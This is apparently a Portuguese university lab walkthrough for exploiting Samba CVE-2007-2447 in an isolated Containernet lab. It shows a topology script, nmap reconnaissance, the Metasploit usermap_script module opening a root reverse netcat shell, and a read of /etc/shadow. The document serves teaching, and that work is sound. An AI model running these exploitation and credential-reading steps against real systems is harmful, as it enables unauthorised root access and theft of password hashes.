<a name="samba-usermap-script"></a>
# Samba `username map script` (CVE-2007-2447)

Disciplina: Segurança da Informação, UFRN/IMD, Prof. Ramon Fontes.
Vulnerabilidade: **Samba `username map script`**, CVE-2007-2447, presente nas versões
3.0.20 a 3.0.25rc3. A diretiva `username map script` passa o username recebido na
autenticação direto para `/bin/sh` sem sanitização. Um username com metacaracteres de
shell executa comando arbitrário. Como o `smbd` roda como root, o comando roda como
**root**, sem precisar de credenciais.

Papéis: `alice` (alvo, Samba vulnerável) e `chuck` (atacante, Metasploit), ligados por um
switch, no padrão dos exemplos do Capítulo 6.

<a name="topology"></a>
## Topologia

```python
#!/usr/bin/python3
import os
from containernet.net import Containernet
from containernet.cli import CLI
from containernet.term import makeTerm
from mininet.log import info, setLogLevel


ALICE_IMAGE = "mgsoutodelira/samba-vuln:latest"
CHUCK_IMAGE = "mgsoutodelira/msf-attacker:latest"


def topology():
    "Topologia: switch ligando Alice (alvo) e Chuck (atacante)."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage=ALICE_IMAGE, cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY': ":{}".format(DISPLAY_ID)},
                            mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage=CHUCK_IMAGE, cpu_shares=20,
                            volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                            environment={'DISPLAY': ":{}".format(DISPLAY_ID)},
                            mac='00:00:00:00:00:02')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    alice1.cmd("echo '10.200.0.1 alice' > /etc/hosts")
    alice1.cmd("/usr/local/samba/start.sh > /tmp/samba.log 2>&1 &")
    makeTerm(chuck1, cmd="bash")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Comando (no host, fora do containernet):
```
sudo python3 topo_samba.py
```
Retorno: sobe `alice` (10.200.0.1, Samba vulnerável já rodando) e `chuck` (10.200.0.2),
abre um terminal gráfico em `chuck` e deixa o prompt `containernet>` disponível no terminal
onde o script foi executado.

<a name="recon"></a>
## Reconhecimento

A partir de `chuck`:

Comando:
```
chuck# nmap -sV 10.200.0.1
```
Retorno:
```
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for alice (10.200.0.1)
Host is up (0.000072s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

A porta 139 às vezes só fecha a faixa de major version. Para confirmar a build exata,
rodar o script `smb-os-discovery` (testado contra o alvo real):

Comando:
```
chuck# nmap -p139,445 -sV --script smb-os-discovery 10.200.0.1
```
Retorno:
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: WORKGROUP)

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.24)
|   Computer name: alice
|   FQDN: alice
|_  System time: 2026-11-18T01:01:56+00:00
```

Samba 3.0.24 está dentro da faixa vulnerável ao CVE-2007-2447 (3.0.20 a 3.0.25rc3).

<a name="exploitation"></a>
## Exploração

A partir de `chuck`, abrir o msfconsole:

Comando:
```
chuck# msfconsole -q
```
Retorno: abre o prompt `msf6 >`.

Localizar o módulo:

Comando:
```
msf6 > search usermap_script
```
Retorno:
```
Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ----------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script       2007-05-14        excellent  No     Samba "username map script" Command Execution
```

Carregar o módulo e ver as opções:

Comando:
```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > show options
```
Retorno:
```
Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)
   RPORT    139              yes       The target port

Payload options (cmd/unix/reverse_netcat):
   LHOST                     yes       The listen address
   LPORT    4444             yes       The listen port
```

Configurar alvo, atacante e payload:

Comando:
```
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.200.0.1
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.200.0.2
msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse_netcat
```
Retorno:
```
RHOSTS => 10.200.0.1
LHOST => 10.200.0.2
payload => cmd/unix/reverse_netcat
```

Executar o exploit:

Comando:
```
msf6 exploit(multi/samba/usermap_script) > exploit
```
Retorno:
```
[*] Started reverse TCP handler on 10.200.0.2:4444
[*] Command shell session 1 opened (10.200.0.2:4444 -> 10.200.0.1:38582) at 2026-11-18 01:05:46 +0000
```

> O `exploit` já abre a sessão **e entra direto nela**: o shell cru aparece em seguida,
> sem precisar rodar `sessions`. Os comandos abaixo (`id`, `hostname`, etc.) são digitados
> nesse shell, não no `msf6 >`.

O módulo não pede credenciais: ele envia um username malicioso no próprio
*session setup* do SMB, o que já dispara a injeção de comando. A sessão acima já é
um shell root em `alice`.

<a name="evidence"></a>
## Evidência (sessão como root)

O shell já está aberto (ver nota acima). Os comandos a seguir são digitados direto nele.

> Se precisar voltar a essa sessão depois de sair dela (`Ctrl+C` ou `background`), usar
> `sessions 1` (sem `-i`: versões recentes do Metasploit, ex. 6.5.x, trocaram a sintaxe
> antiga `sessions -i 1` por `sessions <id>` direto. `-i` agora gera o erro
> `Wrong number of arguments expected: 1, received: 2`).

Comando (digitado dentro do shell):
```
id
```
Retorno:
```
uid=0(root) gid=0(root) groups=0(root)
```

Comando:
```
hostname
```
Retorno:
```
alice
```

Comando:
```
uname -a
```
Retorno:
```
Linux alice 4.x #1 SMP x86_64 GNU/Linux
```

Comando:
```
cat /etc/shadow | head -3
```
Retorno:
```
root:*:18712:0:99999:7:::
daemon:*:18712:0:99999:7:::
bin:*:18712:0:99999:7:::
```

`uid=0(root)` e o acesso ao `/etc/shadow` confirmam execução remota de comando como
root, sem credenciais. A exploração do CVE-2007-2447 foi bem-sucedida.

Encerrar a sessão (sair do shell cru com `Ctrl+C`, depois de volta no `msf6 >`):

Comando:
```
msf6 exploit(multi/samba/usermap_script) > sessions -K
```
Retorno:
```
[*] Killing all sessions...
```

<a name="cleanup"></a>
## Encerrar o laboratório

Comando (no CLI do Containernet):
```
mininet> exit
```
Retorno: para a rede e os containers `alice`/`chuck`.

Comando (no host, limpeza de estado residual):
```
sudo mn -c
```
